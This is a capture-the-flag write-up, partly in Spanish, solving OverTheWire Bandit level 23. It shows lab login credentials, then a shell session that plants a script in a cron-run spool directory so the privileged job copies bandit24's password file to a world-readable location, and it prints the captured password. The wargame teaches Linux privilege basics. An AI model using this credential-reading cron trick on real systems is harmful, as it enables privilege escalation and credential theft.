Level 23
# Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
# Datos  de Acceso 
ssh bandit23@**bandit.labs.overthewire.org** -p2220

User: bandit23 Pass: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
# Solucion 

```bash
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$  cat /usr/bin/cronjob_banditb_24
cat: /usr/bin/cronjob_banditb_24: No such file or directory
bandit23@bandit:~$ mkdir /tmp/bandscho
bandit23@bandit:~$ cd /tmp/bandscho
bandit23@bandit:/tmp/bandscho$ echo "cat /etc/bandit_pass/bandit24 > /tmp/bandscho/password"
cat /etc/bandit_pass/bandit24 > /tmp/bandscho/password
bandit23@bandit:/tmp/bandscho$  echo "cat /etc/bandit_pass/bandit24 > /tmp/bandscho/password" > bandscho.sh
bandit23@bandit:/tmp/bandscho$ cat bandscho.sh
cat /etc/bandit_pass/bandit24 > /tmp/bandscho/password
bandit23@bandit:/tmp/bandscho$ chmod 777 bandscho.sh bandscho.sh
bandit23@bandit:/tmp/bandscho$ touch password
bandit23@bandit:/tmp/bandscho$ chmod 666 password
bandit23@bandit:/tmp/bandscho$ ls -la
total 124
drwxrwxr-x   2 bandit23 bandit23   4096 Mar  7 18:16 .
drwxrwx-wt 711 root     root     114688 Mar  7 18:16 ..
-rwxrwxrwx   1 bandit23 bandit23     55 Mar  7 18:16 bandscho.sh
-rw-rw-rw-   1 bandit23 bandit23      0 Mar  7 18:16 password
bandit23@bandit:/tmp/bandscho$ cp bandscho.sh /var/spool/bandit24/foo/
bandit23@bandit:/tmp/bandscho$ date
Tue Mar  7 06:16:46 PM UTC 2023
bandit23@bandit:/tmp/bandscho$ ls -la
total 124
drwxrwxr-x   2 bandit23 bandit23   4096 Mar  7 18:16 .
drwxrwx-wt 711 root     root     114688 Mar  7 18:16 ..
-rwxrwxrwx   1 bandit23 bandit23     55 Mar  7 18:16 bandscho.sh
-rw-rw-rw-   1 bandit23 bandit23      0 Mar  7 18:16 password
bandit23@bandit:/tmp/bandscho$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
bandit23@bandit:/tmp/bandscho$

```

# Notas Adicionales
- cat se usa para ver el contenido de un archivo.
- echo sirve para dadas en su salida estándar, con un espacio en blanco entre cada una y un carácter "salto de línea" después de la última cadena
- touch se usa principalmente para crear archivos vacíos y cambiar marcas de tiempo de archivos o carpetas.
- chmod nos da la posibilidad de poder cambiar los permisos de los archivos y carpetas de la máquina con Linux.